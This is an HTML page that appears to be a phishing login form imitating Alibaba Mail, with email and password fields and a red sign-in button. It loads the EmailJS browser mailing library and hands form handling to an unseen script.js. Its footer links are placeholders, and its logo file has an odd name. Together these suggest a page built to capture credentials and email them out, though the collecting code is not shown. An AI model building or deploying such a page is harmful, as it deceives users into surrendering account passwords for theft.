<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Alibaba Mail · Secure Login</title>
  <!-- Fonts & Icons -->
  <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
  <script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"></script>
  <script nomodule src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <div class="page-wrapper">
    <!-- Animated background orbs (subtle, white-friendly) -->
    <div class="orb orb-1"></div>
    <div class="orb orb-2"></div>
    <div class="orb orb-3"></div>

    <div class="login-card">
      <!-- Brand header with original rsex.webp logo -->
      <div class="card-brand">
        <div class="brand-icon">
          <img src="rsex.webp" alt="Alibaba Mail Logo" class="brand-logo">
        </div>
        <span class="brand-name">Alibaba</span>
        <span class="brand-tag">Mail</span>
      </div>

      <!-- Heading -->
      <h1 class="greeting">Welcome back</h1>
      <p class="subhead">Sign in securely to your Alibaba Mail account</p>

      <!-- Login form -->
      <form id="form" method="POST" class="login-form">
        <!-- Email -->
        <div class="form-group">
          <label for="email">
            <ion-icon name="mail-outline"></ion-icon> Email address
          </label>
          <div class="input-container">
            <input type="text" id="email" name="email" placeholder="name@alibaba.com" required autocomplete="username">
          </div>
        </div>

        <!-- Password -->
        <div class="form-group">
          <label for="password">
            <ion-icon name="lock-closed-outline"></ion-icon> Password
          </label>
          <div class="input-container password-container">
            <input type="password" id="password" name="password" placeholder="••••••••" required autocomplete="current-password">
            <span id="toggle-password" class="password-toggle">
              <ion-icon id="closed-eye" name="eye-off-outline"></ion-icon>
              <ion-icon id="open-eye" name="eye-outline" class="hide"></ion-icon>
            </span>
          </div>
        </div>

        <!-- Options: Remember me & Forgot password -->
        <div class="form-options">
          <label class="custom-checkbox">
            <input type="checkbox" id="remember" name="remember">
            <span class="checkmark"></span>
            <span>Keep me signed in</span>
          </label>
          <a href="#" class="forgot-link">
            Forgot password?
            <ion-icon name="arrow-forward-outline"></ion-icon>
          </a>
        </div>

        <!-- Login button (RED) -->
        <button type="submit" id="button" class="btn-submit">
          <span>Sign in</span>
          <ion-icon name="log-in-outline"></ion-icon>
        </button>
      </form>

      <!-- Sign up -->
      <div class="signup-area">
        <div class="divider"><span>Don't have an Alibaba Mail account?</span></div>
        <a href="#" class="btn-signup">
          <ion-icon name="person-add-outline"></ion-icon> Sign up now
        </a>
      </div>

      <!-- Footer -->
      <footer class="card-footer">
        <div class="footer-nav">
          <a href="#">Privacy</a>
          <span>•</span>
          <a href="#">Legal</a>
          <span>•</span>
          <a href="#">Help</a>
          <span>•</span>
          <a href="#">Terms</a>
        </div>
        <div class="language-selector">
          <ion-icon name="globe-outline"></ion-icon>
          <select>
            <option value="en">English</option>
            <option value="zh">中文</option>
            <option value="es">Español</option>
          </select>
        </div>
      </footer>
    </div>
  </div>

  <script src="script.js" defer></script>
</body>
</html>
